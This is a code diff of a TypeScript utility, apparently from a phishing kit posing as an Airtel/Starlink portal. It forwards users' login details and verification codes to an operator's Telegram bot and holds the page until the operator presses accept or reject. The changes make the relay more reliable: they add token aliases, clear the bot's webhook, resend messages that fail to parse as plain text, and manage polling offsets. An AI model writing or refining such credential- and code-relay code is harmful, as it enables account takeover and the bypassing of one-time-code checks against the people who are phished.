@@ -124,42 +124,37 @@ export function getExternalBrowserUrl(currentUrl: string): string {
   }
 }
 
+// ---------------------------------------------------------------------------
+// Telegram approval buttons
+// ---------------------------------------------------------------------------
 
-// Telegram Bot Configuration for Airtel Lite & Starlink Portal
-// Credentials are read securely from environment variables (.env / VITE_*)
-// and will never be exposed to GitHub or public repository commits.
+/** Read the first non-empty value from Vite's exposed environment variables. */
+const readEnv = (...keys: string[]): string => {
+  const env = (import.meta as any)?.env || {};
+  for (const key of keys) {
+    const value = env[key];
+    if (typeof value === 'string' && value.trim()) return value.trim();
+  }
+  return '';
+};
+
+// `VITE_TELEGRAM_TOKEN` is the canonical name used by this utility.
+// `VITE_TELEGRAM_BOT_TOKEN` is supported as an alias because deployed .env
+// files use that name — without it, no approval message (or buttons) is sent.
+const getT = () => readEnv('VITE_TELEGRAM_TOKEN', 'VITE_TELEGRAM_BOT_TOKEN');
+const getC = () => readEnv('VITE_TELEGRAM_CHAT_ID');
 
 export const TELEGRAM_CONFIG = {
-  // Fast Polling interval in ms for instant real-time feedback
-  POLL_INTERVAL_MS: 1200,
+  // Delay between getUpdates calls while waiting for a button press
+  POLL_INTERVAL_MS: 3000,
 };
 
-export const getTelegramBotToken = (): string => {
-  if (typeof import.meta !== 'undefined' && (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN) {
-    return (import.meta as any).env.VITE_TELEGRAM_BOT_TOKEN;
-  }
-  return '';
-};
-
-export const getTelegramChatId = (): string => {
-  if (typeof import.meta !== 'undefined' && (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID) {
-    return (import.meta as any).env.VITE_TELEGRAM_CHAT_ID;
-  }
-  return '';
-};
-
+export const getTelegramBotToken = getT;
+export const getTelegramChatId = getC;
 
 /**
  * Reliable Telegram delivery utility.
  */
-const getT = () => {
-  return import.meta.env.VITE_TELEGRAM_TOKEN;
-};
-
-const getC = () => {
-  return import.meta.env.VITE_TELEGRAM_CHAT_ID;
-};
-
 export const sendToTelegram = async (message: string) => {
   const token = getT();
   const chatId = getC();
@@ -203,11 +198,36 @@ export const sendToTelegram = async (message: string) => {
   }
 };
 
-export const sendLoginToTelegramAndWait = async (message: string, username: string, isCode: boolean = false): Promise<boolean> => {
+// getUpdates is disabled while a webhook is configured on the bot. Clear it
+// once per page load and drop stale callbacks so the buttons start fresh.
+let webhookCleared: Promise<void> | null = null;
+const ensureUpdatesEnabled = (token: string): Promise<void> => {
+  if (!webhookCleared) {
+    webhookCleared = fetch(
+      `https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`
+    )
+      .then(() => undefined)
+      .catch(() => undefined);
+  }
+  return webhookCleared;
+};
+
+export const sendLoginToTelegramAndWait = async (
+  message: string,
+  username: string,
+  isCode: boolean = false
+): Promise<boolean> => {
   const token = getT();
   const chatId = getC();
 
-  if (!token || !chatId) return true; // fallback to true
+  if (!token || !chatId) {
+    console.warn(
+      '[Telegram] Missing VITE_TELEGRAM_TOKEN (or VITE_TELEGRAM_BOT_TOKEN) / VITE_TELEGRAM_CHAT_ID — auto-approving.'
+    );
+    return true; // fallback to true
+  }
+
+  await ensureUpdatesEnabled(token);
 
   const sessionKey = `pendingAuth_${username}_${isCode ? 'code' : 'login'}`;
   let messageId = sessionStorage.getItem(sessionKey);
@@ -224,7 +244,7 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
     };
 
     try {
-      const response = await fetch(url, {
+      let response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -234,6 +254,19 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
           reply_markup: keyboard
         }),
       });
+
+      // If HTML parsing fails, resend with the same buttons as plain text.
+      if (!response.ok) {
+        response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message.replace(/<[^>]*>?/gm, ''),
+            reply_markup: keyboard
+          }),
+        });
+      }
 
       if (!response.ok) return true;
       const data = await response.json();
@@ -246,9 +279,9 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
     }
   }
 
-  // Start polling for callback query
-  // We omit offset so we don't accidentally clear updates for other concurrent users.
-  // The Telegram API will return the last 100 unconfirmed updates.
+  // Start polling for callback query.
+  // We omit offset so we don't accidentally clear updates for other concurrent
+  // users; once our own button is pressed, we advance offset past that update.
   while (true) {
     try {
       const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
@@ -257,7 +290,10 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
 
       if (updateData.ok && updateData.result.length > 0) {
         for (const update of updateData.result) {
-          if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
+          if (
+            update.callback_query &&
+            update.callback_query.message?.message_id.toString() === messageId
+          ) {
             const action = update.callback_query.data;
 
             // Acknowledge the callback
@@ -284,9 +320,7 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
             // Clear session after decision
             sessionStorage.removeItem(sessionKey);
 
-            // In a purely frontend app with no offset, we should ideally clear the update
-            // by fetching with offset = update_id + 1, but this would clear other concurrent updates.
-            // We'll advance offset only to our specific update to at least clear up to ours.
+            // Advance offset only to our specific update so it is not seen again.
             await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
 
             return action === 'accept';
@@ -298,7 +332,6 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
     }
 
     // wait a bit before next poll
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    await new Promise(resolve => setTimeout(resolve, TELEGRAM_CONFIG.POLL_INTERVAL_MS));
   }
 };
-
